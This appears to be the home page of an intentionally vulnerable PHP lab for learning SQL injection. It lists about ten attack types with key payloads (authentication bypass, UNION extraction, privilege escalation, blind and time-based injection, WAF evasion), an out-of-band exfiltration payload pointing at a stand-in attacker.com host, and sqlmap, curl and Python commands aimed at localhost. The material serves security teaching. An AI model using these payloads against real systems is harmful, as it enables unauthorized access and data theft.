<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SQL Injection Demo — Home</title>
  <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <script src="bootstrap/js/bootstrap.bundle.min.js"></script>
  <style>
    .hero { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); }
    .card-vuln { border-left: 4px solid #dc3545; transition: transform .15s; }
    .card-vuln:hover { transform: translateY(-3px); box-shadow: 0 6px 20px rgba(0,0,0,.15); }
    .card-adv  { border-left: 4px solid #fd7e14; transition: transform .15s; }
    .card-adv:hover  { transform: translateY(-3px); box-shadow: 0 6px 20px rgba(0,0,0,.15); }
    .card-tool { border-left: 4px solid #0d6efd; transition: transform .15s; }
    .card-tool:hover { transform: translateY(-3px); box-shadow: 0 6px 20px rgba(0,0,0,.15); }
    .badge-diff { font-size: .65rem; }
  </style>
</head>
<body class="bg-light">

<!-- Navbar -->
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
  <div class="container">
    <a class="navbar-brand fw-bold" href="index.php">🔓 SQLi Demo</a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#nav">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="nav">
      <ul class="navbar-nav ms-auto">
        <li class="nav-item"><a class="nav-link active" href="index.php">Home</a></li>
        <li class="nav-item"><a class="nav-link" href="register.php">Register (Vulnerable)</a></li>
        <li class="nav-item"><a class="nav-link" href="register_safe.php">Register (Safe)</a></li>
        <li class="nav-item"><a class="nav-link" href="login.php">Login (Vulnerable)</a></li>
        <li class="nav-item"><a class="nav-link" href="loginsafe.php">Login (Safe)</a></li>
        <li class="nav-item"><a class="nav-link" href="api/index.php">API</a></li>
        <li class="nav-item"><a class="nav-link text-warning fw-bold" href="reset.php">🔄 Reset DB</a></li>
      </ul>
    </div>
  </div>
</nav>

<!-- Hero -->
<div class="hero text-white py-5">
  <div class="container text-center py-3">
    <h1 class="display-5 fw-bold mb-3">SQL Injection Demo Lab</h1>
    <p class="lead mb-4 text-white-50">A fully intentional vulnerable PHP app for learning SQL injection — every attack type demonstrated side-by-side with its fix.</p>
    <div class="d-flex justify-content-center gap-3 flex-wrap">
      <a href="login.php" class="btn btn-danger btn-lg">Start Vulnerable Lab →</a>
      <a href="loginsafe.php" class="btn btn-success btn-lg">Safe Version →</a>
      <a href="#walkthroughs" class="btn btn-outline-light btn-lg">Walkthroughs ↓</a>
    </div>
    <div class="mt-4 d-flex justify-content-center gap-4 flex-wrap">
      <div class="text-center"><div class="display-6 fw-bold text-danger">10</div><div class="small text-white-50">Attack Types</div></div>
      <div class="text-center"><div class="display-6 fw-bold text-warning">8</div><div class="small text-white-50">Walkthroughs</div></div>
      <div class="text-center"><div class="display-6 fw-bold text-info">1</div><div class="small text-white-50">Vulnerable API</div></div>
      <div class="text-center"><div class="display-6 fw-bold text-success">Every Fix</div><div class="small text-white-50">Included</div></div>
    </div>
  </div>
</div>

<div class="container py-5">

  <!-- Quick Access -->
  <div class="row g-3 mb-5">
    <div class="col-md-3">
      <a href="login.php" class="btn btn-outline-danger w-100 py-3">
        🔐 Login (Vulnerable)<br><small class="text-muted">Auth bypass demo</small>
      </a>
    </div>
    <div class="col-md-3">
      <a href="register.php" class="btn btn-outline-danger w-100 py-3">
        📝 Register (Vulnerable)<br><small class="text-muted">INSERT + second-order</small>
      </a>
    </div>
    <div class="col-md-3">
      <a href="api/index.php" class="btn btn-outline-primary w-100 py-3">
        🔌 Vulnerable API<br><small class="text-muted">REST endpoints with SQLi</small>
      </a>
    </div>
    <div class="col-md-3">
      <a href="reset.php" class="btn btn-outline-warning w-100 py-3">
        🔄 Reset Database<br><small class="text-muted">Restore default users & data</small>
      </a>
    </div>
  </div>

  <!-- Walkthroughs Section -->
  <h2 class="mb-1" id="walkthroughs">📖 Vulnerability Walkthroughs</h2>
  <p class="text-muted mb-4">Click any card to read the full step-by-step walkthrough — attack payloads, how to observe the exploit, and the fix.</p>

  <h5 class="text-danger mb-3">Basic Attacks</h5>
  <div class="row g-4 mb-4">

    <!-- Auth Bypass -->
    <div class="col-md-4">
      <div class="card h-100 card-vuln">
        <div class="card-body">
          <div class="d-flex justify-content-between align-items-start mb-2">
            <h5 class="card-title mb-0">🔐 Authentication Bypass</h5>
            <span class="badge bg-danger badge-diff">Basic</span>
          </div>
          <p class="card-text small text-muted">Bypass the login form with <code>' OR '1'='1'--</code>. No password needed. Log in as any user including admin.</p>
          <div class="mb-2">
            <span class="badge bg-secondary">In-band</span>
            <span class="badge bg-secondary">Classic</span>
          </div>
          <p class="small mb-1"><strong>Key payload:</strong></p>
          <code class="small">' OR '1'='1'--</code>
        </div>
        <div class="card-footer bg-transparent d-flex gap-2">
          <a href="login.php" class="btn btn-sm btn-outline-danger">Try It</a>
          <a href="login.php?walkthrough=1#walkthrough" class="btn btn-sm btn-danger">Full Walkthrough →</a>
        </div>
      </div>
    </div>

    <!-- UNION -->
    <div class="col-md-4">
      <div class="card h-100 card-vuln">
        <div class="card-body">
          <div class="d-flex justify-content-between align-items-start mb-2">
            <h5 class="card-title mb-0">🔗 UNION Data Extraction</h5>
            <span class="badge bg-danger badge-diff">Intermediate</span>
          </div>
          <p class="card-text small text-muted">Append a UNION SELECT to pull data from any table — including the hidden <code>secret</code> table and <code>information_schema</code>.</p>
          <div class="mb-2">
            <span class="badge bg-secondary">In-band</span>
            <span class="badge bg-secondary">Exfiltration</span>
          </div>
          <p class="small mb-1"><strong>Key payload:</strong></p>
          <code class="small">%' UNION SELECT id,name,filepath,1,1,1,1 FROM secret--</code>
        </div>
        <div class="card-footer bg-transparent d-flex gap-2">
          <a href="login.php" class="btn btn-sm btn-outline-danger">Try It</a>
          <a href="login.php?walkthrough=union" class="btn btn-sm btn-danger">Full Walkthrough →</a>
        </div>
      </div>
    </div>

    <!-- Privilege Escalation -->
    <div class="col-md-4">
      <div class="card h-100 card-vuln">
        <div class="card-body">
          <div class="d-flex justify-content-between align-items-start mb-2">
            <h5 class="card-title mb-0">👑 Privilege Escalation</h5>
            <span class="badge bg-danger badge-diff">Intermediate</span>
          </div>
          <p class="card-text small text-muted">Inject extra columns into an UPDATE SET clause to change your own <code>account_type</code> to <code>admin</code>.</p>
          <div class="mb-2">
            <span class="badge bg-secondary">UPDATE</span>
            <span class="badge bg-secondary">Privilege</span>
          </div>
          <p class="small mb-1"><strong>Key payload:</strong></p>
          <code class="small">anything', account_type='admin</code>
        </div>
        <div class="card-footer bg-transparent d-flex gap-2">
          <a href="login.php" class="btn btn-sm btn-outline-danger">Try It</a>
          <a href="login.php?walkthrough=privesc" class="btn btn-sm btn-danger">Full Walkthrough →</a>
        </div>
      </div>
    </div>

  </div>

  <h5 class="text-warning mb-3">Advanced Attacks</h5>
  <div class="row g-4 mb-4">

    <!-- Error-Based -->
    <div class="col-md-4">
      <div class="card h-100 card-adv">
        <div class="card-body">
          <div class="d-flex justify-content-between align-items-start mb-2">
            <h5 class="card-title mb-0">💥 Error-Based Injection</h5>
            <span class="badge bg-warning text-dark badge-diff">Intermediate</span>
          </div>
          <p class="card-text small text-muted">Force the database to embed extracted data inside an error message using <code>extractvalue()</code>.</p>
          <div class="mb-2">
            <span class="badge bg-secondary">Error Channel</span>
          </div>
          <p class="small mb-1"><strong>Key payload:</strong></p>
          <code class="small">1 AND extractvalue(1,concat(0x7e,(SELECT version())))</code>
        </div>
        <div class="card-footer bg-transparent d-flex gap-2">
          <a href="login.php" class="btn btn-sm btn-outline-warning">Try It</a>
          <a href="login.php?walkthrough=error_based" class="btn btn-sm btn-warning">Full Walkthrough →</a>
        </div>
      </div>
    </div>

    <!-- Blind Boolean -->
    <div class="col-md-4">
      <div class="card h-100 card-adv">
        <div class="card-body">
          <div class="d-flex justify-content-between align-items-start mb-2">
            <h5 class="card-title mb-0">👁 Blind Boolean</h5>
            <span class="badge bg-warning text-dark badge-diff">Advanced</span>
          </div>
          <p class="card-text small text-muted">Extract any data character-by-character using only a true/false page response — no errors, no data shown.</p>
          <div class="mb-2">
            <span class="badge bg-secondary">Blind</span>
            <span class="badge bg-secondary">Boolean</span>
          </div>
          <p class="small mb-1"><strong>Key payload:</strong></p>
          <code class="small">8 AND substring((SELECT database()),1,1)='s'</code>
        </div>
        <div class="card-footer bg-transparent d-flex gap-2">
          <a href="login.php" class="btn btn-sm btn-outline-warning">Try It</a>
          <a href="login.php?walkthrough=blind_boolean" class="btn btn-sm btn-warning">Full Walkthrough →</a>
        </div>
      </div>
    </div>

    <!-- Time-Based -->
    <div class="col-md-4">
      <div class="card h-100 card-adv">
        <div class="card-body">
          <div class="d-flex justify-content-between align-items-start mb-2">
            <h5 class="card-title mb-0">⏱ Time-Based Blind</h5>
            <span class="badge bg-warning text-dark badge-diff">Advanced</span>
          </div>
          <p class="card-text small text-muted">Use <code>SLEEP()</code> to extract data when there is zero visual output — timing is the only signal.</p>
          <div class="mb-2">
            <span class="badge bg-secondary">Blind</span>
            <span class="badge bg-secondary">Timing</span>
          </div>
          <p class="small mb-1"><strong>Key payload:</strong></p>
          <code class="small">1 AND IF(1=1, SLEEP(3), 0)</code>
        </div>
        <div class="card-footer bg-transparent d-flex gap-2">
          <a href="login.php" class="btn btn-sm btn-outline-warning">Try It</a>
          <a href="login.php?walkthrough=time_based" class="btn btn-sm btn-warning">Full Walkthrough →</a>
        </div>
      </div>
    </div>

    <!-- Second Order -->
    <div class="col-md-4">
      <div class="card h-100 card-adv">
        <div class="card-body">
          <div class="d-flex justify-content-between align-items-start mb-2">
            <h5 class="card-title mb-0">🔄 Second-Order (Stored)</h5>
            <span class="badge bg-warning text-dark badge-diff">Advanced</span>
          </div>
          <p class="card-text small text-muted">Payload stored safely with a prepared statement fires later in a different unsanitized query. Register → Login → Trigger.</p>
          <div class="mb-2">
            <span class="badge bg-secondary">Stored</span>
            <span class="badge bg-secondary">Delayed</span>
          </div>
          <p class="small mb-1"><strong>Register with username:</strong></p>
          <code class="small">admin'--</code>
        </div>
        <div class="card-footer bg-transparent d-flex gap-2">
          <a href="register.php" class="btn btn-sm btn-outline-warning">Try It</a>
          <a href="login.php?walkthrough=second_order" class="btn btn-sm btn-warning">Full Walkthrough →</a>
        </div>
      </div>
    </div>

    <!-- WAF Bypass -->
    <div class="col-md-4">
      <div class="card h-100 card-adv">
        <div class="card-body">
          <div class="d-flex justify-content-between align-items-start mb-2">
            <h5 class="card-title mb-0">🛡 WAF Bypass</h5>
            <span class="badge bg-warning text-dark badge-diff">Advanced</span>
          </div>
          <p class="card-text small text-muted">Evade naive keyword-blacklist WAFs using case variation, comment injection, hex encoding, and double-nesting.</p>
          <div class="mb-2">
            <span class="badge bg-secondary">Evasion</span>
            <span class="badge bg-secondary">Obfuscation</span>
          </div>
          <p class="small mb-1"><strong>Key technique:</strong></p>
          <code class="small">UN/**/ION SE/**/LECT ...</code>
        </div>
        <div class="card-footer bg-transparent d-flex gap-2">
          <a href="login.php" class="btn btn-sm btn-outline-warning">Try It</a>
          <a href="login.php?walkthrough=waf_bypass" class="btn btn-sm btn-warning">Full Walkthrough →</a>
        </div>
      </div>
    </div>

    <!-- OOB -->
    <div class="col-md-4">
      <div class="card h-100 card-adv">
        <div class="card-body">
          <div class="d-flex justify-content-between align-items-start mb-2">
            <h5 class="card-title mb-0">📡 Out-of-Band (OOB)</h5>
            <span class="badge bg-warning text-dark badge-diff">Advanced</span>
          </div>
          <p class="card-text small text-muted">Exfiltrate data via DNS lookups or HTTP requests triggered by the DB server — bypasses all in-band detection.</p>
          <div class="mb-2">
            <span class="badge bg-secondary">Out-of-Band</span>
            <span class="badge bg-secondary">DNS</span>
          </div>
          <p class="small mb-1"><strong>Key technique:</strong></p>
          <code class="small">LOAD_FILE(concat('\\\\',(...).attacker.com,'\\'))</code>
        </div>
        <div class="card-footer bg-transparent d-flex gap-2">
          <a href="login.php" class="btn btn-sm btn-outline-warning">Try It</a>
          <a href="login.php?walkthrough=oob" class="btn btn-sm btn-warning">Full Walkthrough →</a>
        </div>
      </div>
    </div>

    <!-- Routed -->
    <div class="col-md-4">
      <div class="card h-100 card-adv">
        <div class="card-body">
          <div class="d-flex justify-content-between align-items-start mb-2">
            <h5 class="card-title mb-0">🔀 Routed SQLi</h5>
            <span class="badge bg-warning text-dark badge-diff">Advanced</span>
          </div>
          <p class="card-text small text-muted">Injection in one query whose results flow into a second query — the attack routes through the application's own logic.</p>
          <div class="mb-2">
            <span class="badge bg-secondary">Multi-hop</span>
            <span class="badge bg-secondary">Chained</span>
          </div>
          <p class="small mb-1"><strong>Key concept:</strong></p>
          <code class="small">Query 1 → result → Query 2 (vulnerable)</code>
        </div>
        <div class="card-footer bg-transparent d-flex gap-2">
          <a href="login.php" class="btn btn-sm btn-outline-warning">Try It</a>
          <a href="login.php?walkthrough=routed" class="btn btn-sm btn-warning">Full Walkthrough →</a>
        </div>
      </div>
    </div>

    <!-- API SQLi -->
    <div class="col-md-4">
      <div class="card h-100 card-tool">
        <div class="card-body">
          <div class="d-flex justify-content-between align-items-start mb-2">
            <h5 class="card-title mb-0">🔌 API SQL Injection</h5>
            <span class="badge bg-primary badge-diff">API</span>
          </div>
          <p class="card-text small text-muted">REST API endpoints vulnerable to SQLi via GET params, POST JSON body, and HTTP headers. Try with curl or Postman.</p>
          <div class="mb-2">
            <span class="badge bg-secondary">REST</span>
            <span class="badge bg-secondary">JSON</span>
            <span class="badge bg-secondary">Headers</span>
          </div>
          <p class="small mb-1"><strong>Endpoints:</strong></p>
          <code class="small">/api/users, /api/search, /api/login</code>
        </div>
        <div class="card-footer bg-transparent d-flex gap-2">
          <a href="api/index.php" class="btn btn-sm btn-outline-primary">API Docs</a>
          <a href="login.php?walkthrough=api" class="btn btn-sm btn-primary">Full Walkthrough →</a>
        </div>
      </div>
    </div>

  </div>

  <!-- Tools Section -->
  <hr class="my-5">
  <h2 class="mb-1">🛠 Testing Tools</h2>
  <p class="text-muted mb-4">Ready-to-run commands targeting this lab.</p>
  <div class="row g-4 mb-5">
    <div class="col-md-4">
      <div class="card card-tool h-100">
        <div class="card-header bg-dark text-white"><strong>sqlmap</strong></div>
        <div class="card-body">
          <pre class="small bg-light p-2 rounded mb-1">sqlmap -u "http://localhost:8080/profile.php?action=union_search&search=x" --dbs --batch</pre>
          <pre class="small bg-light p-2 rounded">sqlmap -u "http://localhost:8080/api/users.php?id=1" --dump --batch</pre>
        </div>
        <div class="card-footer"><a href="login.php?walkthrough=tools" class="btn btn-sm btn-outline-dark">Full Guide →</a></div>
      </div>
    </div>
    <div class="col-md-4">
      <div class="card card-tool h-100">
        <div class="card-header bg-dark text-white"><strong>curl — API Testing</strong></div>
        <div class="card-body">
          <pre class="small bg-light p-2 rounded mb-1">curl "http://localhost:8080/api/users.php?id=1 UNION SELECT 1,2,3--"</pre>
          <pre class="small bg-light p-2 rounded">curl -X POST http://localhost:8080/api/login.php -H "Content-Type: application/json" -d '{"email":"'"'"' OR 1=1--","password":"x"}'</pre>
        </div>
        <div class="card-footer"><a href="api/index.php" class="btn btn-sm btn-outline-dark">API Docs →</a></div>
      </div>
    </div>
    <div class="col-md-4">
      <div class="card card-tool h-100">
        <div class="card-header bg-dark text-white"><strong>Python Automation</strong></div>
        <div class="card-body">
          <pre class="small bg-light p-2 rounded">import requests
# Boolean blind extraction
r = requests.get("http://localhost:8080/profile.php", params={"action":"blind_boolean","uid":"8 AND 1=1"})
print("found" in r.text.lower())</pre>
        </div>
        <div class="card-footer"><a href="login.php?walkthrough=tools" class="btn btn-sm btn-outline-dark">Scripts →</a></div>
      </div>
    </div>
  </div>

  <!-- Footer note -->
  <div class="alert alert-warning">
    <strong>⚠️ For Educational Use Only.</strong> This application is intentionally vulnerable and should only be run in an isolated local/Docker environment. Never expose it to a public network.
  </div>

</div>
</body>
</html>
